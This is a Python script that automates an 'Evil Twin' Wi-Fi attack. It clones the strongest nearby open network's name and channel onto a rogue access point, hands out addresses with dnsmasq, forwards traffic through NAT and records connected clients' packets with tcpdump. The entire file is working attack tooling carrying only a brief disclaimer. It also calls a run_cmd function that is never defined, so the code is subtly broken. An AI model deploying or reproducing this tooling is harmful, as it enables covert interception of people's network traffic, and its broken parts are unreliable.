#!/usr/bin/env python3

"""
main.py - Evil Twin Automation
Author: YourName
Date: 2025-xx-xx

Automates:
1) Scanning for open Wi-Fi networks (STA_INTERFACE)
2) Connecting to strongest open network
3) Auto-detecting the AP's channel to mimic in Evil Twin
4) Configuring a second interface (AP_INTERFACE) as Evil Twin
5) Enabling NAT and packet forwarding
6) Starting hostapd + dnsmasq
7) Logging captured traffic

DISCLAIMER: For authorized security research only.
"""

import sys
import time
import os
import logging

from modules.net_scan import scan_for_open_networks, pick_strongest_open_network
from modules.net_connect import connect_to_open_wifi
from modules.ap_config import (
    write_hostapd_config,
    write_dnsmasq_config,
    configure_ap_interface,
    start_hostapd_dnsmasq
)
from modules.net_config import enable_nat

# -------------------------
# Configuration Constants
# -------------------------

STA_INTERFACE = "wlan0"   # Interface that connects to upstream Wi-Fi
AP_INTERFACE = "wlan1"    # Interface that creates the Evil Twin AP

# Paths
HOSTAPD_CONFIG_TEMPLATE = "config_templates/hostapd.conf.template"
DNSMASQ_CONFIG_TEMPLATE = "config_templates/dnsmasq.conf.template"
HOSTAPD_CONFIG = "/etc/hostapd/hostapd.conf"
DNSMASQ_CONFIG = "/etc/dnsmasq.conf"

AP_IP = "192.168.50.1"
DHCP_RANGE_START = "192.168.50.2"
DHCP_RANGE_END = "192.168.50.200"
NETMASK = "255.255.255.0"
LOG_DIR = "/var/log/evil_twin/"
MAX_RETRIES = 3

# Ensure log directory exists
os.makedirs(LOG_DIR, exist_ok=True)

logging.basicConfig(
    filename=f"{LOG_DIR}main.log",
    filemode='a',
    format='%(asctime)s - %(levelname)s - %(message)s',
    level=logging.INFO
)

def check_internet_connectivity(interface):
    """ Checks if the interface has an assigned IP (i.e., connected to upstream Wi-Fi). """
    try:
        output = run_cmd(f"ip -4 addr show {interface} | grep inet")
        return bool(output)  # Returns True if IP is assigned
    except Exception as e:
        logging.error(f"Failed to check connectivity: {e}")
        return False

def start_tcpdump(interface, output_dir=LOG_DIR):
    """ Starts tcpdump to capture traffic from connected clients. """
    capture_file = f"{output_dir}capture_{time.strftime('%Y%m%d_%H%M%S')}.pcap"
    cmd = f"sudo tcpdump -i {interface} -w {capture_file} &"
    run_cmd(cmd)
    logging.info(f"Started packet capture: {capture_file}")

def main():
    if os.geteuid() != 0:
        print("[ERROR] This script must be run as root (sudo).")
        sys.exit(1)

    attempt = 0
    while attempt < MAX_RETRIES:
        print("[*] Scanning for open networks...")
        networks = scan_for_open_networks(STA_INTERFACE)
        if not networks:
            print("[WARN] No open networks found. Retrying...")
            attempt += 1
            time.sleep(10)
            continue

        strongest = pick_strongest_open_network(networks)
        if not strongest:
            print("[WARN] No viable open network detected. Retrying...")
            attempt += 1
            time.sleep(10)
            continue

        ssid, channel = strongest["ssid"], strongest["channel"]
        print(f"[INFO] Attempting to connect to: '{ssid}' (Channel {channel})")

        if connect_to_open_wifi(ssid, STA_INTERFACE):
            break  # Successful connection

        attempt += 1
        time.sleep(10)

    if not check_internet_connectivity(STA_INTERFACE):
        print("[ERROR] No internet connectivity. Exiting.")
        sys.exit(1)

    configure_ap_interface(AP_INTERFACE, AP_IP)
    write_hostapd_config(HOSTAPD_CONFIG_TEMPLATE, HOSTAPD_CONFIG, AP_INTERFACE, ssid, channel)
    write_dnsmasq_config(DNSMASQ_CONFIG_TEMPLATE, DNSMASQ_CONFIG, AP_INTERFACE, AP_IP, DHCP_RANGE_START, DHCP_RANGE_END, NETMASK)
    start_hostapd_dnsmasq()
    enable_nat(STA_INTERFACE, AP_INTERFACE)
    start_tcpdump(AP_INTERFACE)

if __name__ == "__main__":
    main()
